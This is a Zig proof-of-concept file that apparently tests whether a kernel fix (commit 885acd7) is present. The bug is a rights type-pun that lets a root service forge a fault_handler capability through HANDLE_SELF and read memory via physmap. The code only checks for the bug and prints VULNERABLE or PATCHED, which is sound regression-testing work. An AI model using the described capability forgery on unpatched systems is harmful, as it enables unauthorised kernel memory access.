// PoC for 885acd7: sysFaultReadMem/sysFaultWriteMem HANDLE_SELF rights pun.
//
// Pre-patch: slot 0 of the permission table stores ProcessRights, but
// `entry.processHandleRights()` bitcasts the u16 to ProcessHandleRights.
// The two layouts disagree on the fault_handler bit position
// (ProcessRights bit 6 = device_own; ProcessHandleRights bit 6 = fault_handler).
// So a HANDLE_SELF lookup on any process that holds device_own — i.e. the
// stock root service — type-puns device_own as fault_handler and passes
// the rights check without ever actually holding fault_handler. The
// syscall then proceeds to copy bytes through physmap.
//
// Post-patch: both syscalls reject proc_handle == 0 outright (E_PERM)
// before reaching the punned rights check.
//
// Differential: call fault_read_mem(HANDLE_SELF, user_vaddr, scratch, 16)
// against a freshly-reserved user page (so the post-c576f52 vaddr bounds
// guard is satisfied; this isolates the rights-pun bug from the
// independent vaddr bug noted in commit 885acd7's message).
//   Pre-patch:  E_OK     → VULNERABLE
//   Post-patch: E_PERM   → PATCHED
//
// Load-bearing: yes. Without the HANDLE_SELF reject, root service can
// trivially turn its (always-held) device_own bit into a forged
// fault_handler capability on itself and proceed to read/write its own
// user pages via the kernel-side physmap path — and absent c576f52, into
// arbitrary kernel memory.

const lib = @import("lib");
const syscall = lib.syscall;

const HANDLE_SELF: u64 = 0;

pub fn main(_: u64) void {
    // One user page as the debug target, another as the dest buffer.
    const target_res = syscall.mem_reserve(0, syscall.PAGE4K, 0x3);
    if (target_res.val < 0) {
        syscall.write("POC-885acd7: reserve target failed\n");
        syscall.shutdown();
    }
    const target_va: u64 = target_res.val2;

    const buf_res = syscall.mem_reserve(0, syscall.PAGE4K, 0x3);
    if (buf_res.val < 0) {
        syscall.write("POC-885acd7: reserve buf failed\n");
        syscall.shutdown();
    }
    const buf_va: u64 = buf_res.val2;

    // Touch both pages so they are committed before the syscall runs.
    const target_ptr: [*]u8 = @ptrFromInt(target_va);
    const buf_ptr: [*]u8 = @ptrFromInt(buf_va);
    var i: usize = 0;
    while (i < 16) {
        target_ptr[i] = @intCast(0xA0 + i);
        buf_ptr[i] = 0;
        i += 1;
    }

    const rc = syscall.fault_read_mem(HANDLE_SELF, target_va, buf_va, 16);

    if (rc == syscall.E_PERM) {
        syscall.write("POC-885acd7: PATCHED\n");
    } else if (rc == syscall.E_OK) {
        syscall.write("POC-885acd7: VULNERABLE\n");
    } else {
        syscall.write("POC-885acd7: UNEXPECTED\n");
    }
    syscall.shutdown();
}
